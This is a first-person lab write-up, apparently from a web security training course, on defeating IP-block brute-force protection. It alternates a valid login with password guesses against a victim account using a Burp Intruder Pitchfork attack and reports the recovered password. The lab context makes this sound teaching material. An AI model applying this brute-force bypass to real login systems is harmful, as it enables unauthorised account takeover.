# Broken Brute-Force Protection, IP Block

## Lab Overview



This lab is vulnerable to **broken brute-force protection** due to a **logic flaw** in the IP-based blocking 
mechanism.


The IP is temporarily blocked after **3 consecutive failed login attempts**.



However, successfully logging in to my own account resets the failed-attempt counter.



This behavior can be abused to brute-force the victim's password.



---



## Logic Flaw



Instead of sending multiple failed login attempts for `carlos` in a row:



```text

carlos + password1

carlos + password2

carlos + password3

```



I alternated between my valid account and the victim's account:



```text

wiener + peter

carlos + password1



wiener + peter

carlos + password2



wiener + peter

carlos + password3

```



The successful login as `wiener` resets the failed-attempt counter before the next attempt against `carlos`.



---



## Burp Intruder Setup



I used a **Pitchfork attack** with payload positions in both parameters:



```http

username=§USERNAME§&password=§PASSWORD§

```



### Payload 1 — Username



The list alternated between:



```text

wiener

carlos

wiener

carlos

wiener

carlos

...

```



`carlos` was repeated at least 100 times.



### Payload 2 — Password



I added my own password, `peter`, before every candidate password so that the two payload lists stayed aligned:



```text

peter

123456

peter

password

peter

12345678

peter

qwerty

...

```



This resulted in:



```text

wiener  → peter

carlos  → 123456

wiener  → peter

carlos  → password

wiener  → peter

carlos  → 12345678

...
```



---



## Resource Pool



I created a Resource Pool and set:



```text

Maximum concurrent requests: 1

```




This ensures that the requests are sent in the correct order.



The order is important because the successful `wiener` login must happen before each `carlos` attempt to reset the 
failed-login counter.



---




## Finding the Password



After the attack finished, I filtered out responses with a:



```text

200

```



status code and sorted the results by username.



There was a single **302 response** for:



```text

carlos

```



The password from the Payload 2 column was:



```text

moscow

```



---




## Final Credentials




```text
Username: carlos

Password: moscow

```



I used these credentials to log in to Carlos's account and solve the lab.


---

## Attack Flow


```text

IP Block after 3 failed attempts


            ↓

Successful login as wiener

            ↓

Failed-attempt counter resets

            ↓

Try a password for carlos

            ↓

Successful login as wiener

            ↓

Counter resets again

            ↓

Try the next password for carlos

            ↓


            ...

            ↓

       carlos:moscow

            ↓

          302

            ↓

      Account Access

```



## Key Takeaways




* The protection is vulnerable because of a **logic flaw**, not because IP blocking is completely absent.

* A successful login to another account resets the failed-login counter.

* This reset can be abused to brute-force another user's password.

* **Pitchfork** keeps the username and password payloads synchronized.

* Setting **Maximum concurrent requests to 1** preserves the required request order.

* The correct password was identified by the **302 response**.
